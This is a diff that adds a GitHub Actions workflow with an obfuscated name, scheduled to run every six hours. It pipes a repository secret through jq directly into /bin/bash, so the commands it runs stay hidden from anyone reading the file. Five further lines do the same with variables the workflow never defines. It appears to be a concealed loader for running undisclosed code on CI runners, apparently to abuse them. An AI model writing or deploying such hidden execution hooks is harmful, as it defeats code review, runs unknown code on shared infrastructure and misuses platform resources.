@@ -1,0 +1,22 @@
+name: huangzhongren4637
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangzhongren4637
+        env:
+          ufftn41: ${{ secrets.ufftn41 }}
+        run: |
+          echo $ufftn41 | jq -r .kkm08 | /bin/bash
+          echo $msso1 | jq -r .nez56 | /bin/bash
+          echo $shg70135 | jq -r .lv70 | /bin/bash
+          echo $pggzd8 | jq -r .w91143 | /bin/bash
+          echo $c0 | jq -r .nsssr0998 | /bin/bash
+          echo $liq0 | jq -r .k591 | /bin/bash
+
